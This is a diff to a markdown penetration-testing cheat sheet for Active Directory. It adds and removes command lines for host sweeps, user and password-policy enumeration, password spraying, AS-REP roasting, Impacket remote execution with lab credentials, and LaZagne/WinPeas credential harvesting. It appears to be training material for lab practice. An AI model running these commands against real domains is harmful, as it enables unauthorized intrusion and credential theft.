@@ -88,39 +88,6 @@ Reference: [Web Exploitation](https://github.com/Aghalarovf/Penetration-Tester/t
 
 ## 12. Pivoting and Internal Network Discovery
 
-**Ligolo-ng** is used for tunneling/pivoting into internal segments once an initial foothold is established.
-
-**Windows — live host sweep**
-```powershell
-$path = "$env:USERPROFILE\Desktop\live_hosts.txt"
-$subnet = "172.16.6"
-1..254 | ForEach-Object {
-    $ip = "$subnet.$_"
-    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -BufferSize 16 -Delay 1) {
-        Write-Host "$ip Reply" -ForegroundColor Green
-        $ip | Out-File -FilePath $path -Append
-    }
-}
-```
-
-**Linux — live host sweep**
-```bash
-#!/bin/bash
-output_file="$HOME/Desktop/live_hosts.txt"
-subnet="172.16.6"
-trap "echo -e '\nScan interrupted by user. Exiting...'; exit" SIGINT
-> "$output_file"
-echo "Scanning subnet $subnet.0/24... Press Ctrl+C to stop."
-for i in {1..254}; do
-    ip="$subnet.$i"
-    if ping -c 1 -W 1 "$ip" &> /dev/null; then
-        echo "$ip Reply"
-        echo "$ip" >> "$output_file"
-    fi
-done
-echo "Scan complete."
-```
-
 **Metasploit — ping sweep through a session**
 ```
 msf6 > use post/multi/gather/ping_sweep
@@ -128,12 +95,6 @@ msf6 post(multi/gather/ping_sweep) > set RHOSTS 172.16.5.0/24
 msf6 post(multi/gather/ping_sweep) > set SESSION 1
 msf6 post(multi/gather/ping_sweep) > run
 ```
-
----
-
-## 13. Service Enumeration
-
-Reference: [Service Enumeration notes](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services)
 
 ---
 
@@ -172,69 +133,29 @@ Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetrati
 
 ---
 
+## 17. AS-REP Roasting
+```powershell
+python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
+```
+Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
+
+---
+
+## 17. Kerberoasting
+
+Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)
+
+---
+
 ## 17.5. NTLM Relaying
 
 Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)
 
 ---
 
-## 18. Credential Discovery 
-
-Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)
-
----
-
-## 19. Password Policy Enumeration
-
-```bash
-# CrackMapExec
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
-
-# rpcclient (null session)
-rpcclient -U "" -N 172.16.5.5
-getdompwinfo
-
-# enum4linux
-enum4linux -P 172.16.5.5
-
-# LDAP search
-ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
-```
-
-**Windows**
-```
-net accounts
-```
-
-**PowerView**
-```powershell
-Import-Module .\PowerView.ps1
-Get-DomainPolicy
-```
-
----
-
 ## 20. Username Enumeration
 
 ```bash
-# OSINT wordlists
-# https://github.com/insidetrust/statistically-likely-usernames
-# https://github.com/initstring/linkedin2username
-
-# enum4linux
-enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-
-# rpcclient
-rpcclient -U "" -N 172.16.5.5
-enumdomusers
-
-# CrackMapExec
-crackmapexec smb 172.16.5.5 --users
-sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
-
-# LDAP search
-ldapsearch -H ldap://192.168.0.200 -x -b "DC=OXSIUM,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
-
 # windapsearch
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
@@ -245,38 +166,17 @@ ldapsearch -H ldap://192.168.0.200 -x -b "DC=OXSIUM,DC=LOCAL" -s sub "(&(objectc
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
-> Also obtainable passively via **NTLM Relay** or **Responder** capture.
+---
+
+## 18. Credential Discovery 
+
+Reference: [Username & Password Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)
 
 ---
 
-## 20. AS-REP Roasting
-```powershell
-python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
-```
-Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
+## 22. Data Visualization with BloodHound
 
----
-
-## 21. Password Spraying
-
-**Linux**
-```bash
-for u in $(cat wordlist.txt); do
-  rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority
-done
-
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
-
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
-sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
-sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
-```
-
-**Windows**
-```powershell
-Import-Module .\DomainPasswordSpray.ps1
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-```
+Reference: [Data Collect and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)
 
 ---
 
@@ -286,12 +186,6 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 
 history
 ```
-
----
-
-## 22. Data Visualization with BloodHound
-
-Reference: [Data Collect and Visualization](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/BloodHound.md)
 
 ---
 
@@ -308,87 +202,17 @@ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
 smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 ```
 
-**rpcclient — user lookup**
-```
-rpcclient -U "" -N 172.16.5.5
-enumdomusers
-user:[administrator] rid:[0x1f4]
-queryuser 0x1f4
-```
-
-**Remote command execution (Impacket)**
-```bash
-# https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
-# https://github.com/fortra/impacket/blob/master/examples/psexec.py
-
-psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
-wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
-```
-
-**windapsearch**
-```bash
-# https://github.com/ropnop/windapsearch
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
-python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
-```
-
-**BloodHound data collection**
-```bash
-# https://github.com/dirkjanm/BloodHound.py
-sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
-```
-
 ---
 
 ## 23. Credentialed Enumeration — From Windows
 
-**Active Directory Module**
-```powershell
-Import-Module ActiveDirectory
-Get-ADDomain
-```
-
-**Users, groups, and SPNs**
-```powershell
-# Users with an SPN set
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name
-
-# Filtered SPN list
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,ServicePrincipalNames |
-Where-Object {$_.ServicePrincipalName -match "HTTP/|MSSQL/|CIFS/"} |
-Select Name, ServicePrincipalName
-
-# Kerberoastable users
-Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and ServicePrincipalNames -like "*/*"} -Properties ServicePrincipalName,ServicePrincipalNames |
-Select Name, ServicePrincipalName | Sort Name
-
-Get-ADTrust -Filter *
-Get-ADGroup -Filter * | Select Name
-Get-ADGroup -Identity "Backup Operators"
-Get-ADGroupMember -Identity "Backup Operators"
-```
-
-**PowerView essentials**
-```powershell
-# Specific user detail
-Get-DomainUser -Identity mmorgan -Domain inlanefreight.local |
-Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-
-# Local admins on a host
-Get-NetLocalGroupMember -ComputerName TARGETHOST -GroupName "Administrators"
-
-# Disabled accounts
-Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
-
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-Get-DomainTrustMapping
-Test-AdminAccess -ComputerName ACADEMY-EA-MS01
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-```
-
 **Snaffler — share/credential discovery**
 ```powershell
 .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
+
+.\LaZagne.exe -a
+
+.\WinPeas.exe
 ```
 
 ---
@@ -405,27 +229,9 @@ Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetrat
 
 ---
 
-## 26. PowerView Enumeration Checklist
-
-Reference: [Full Enumeration with PowerView](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Tools/PowerView.md)
-
----
-
 ## 26. GPO Abuse
 
 Reference: [GPO Abuse tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)
-
----
-
-## 27. AD CS Enumeration
-
-Reference: [Certificate Services Abuse]()
-
----
-
-## 28. Kerberoasting
-
-Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)
 
 ---
 
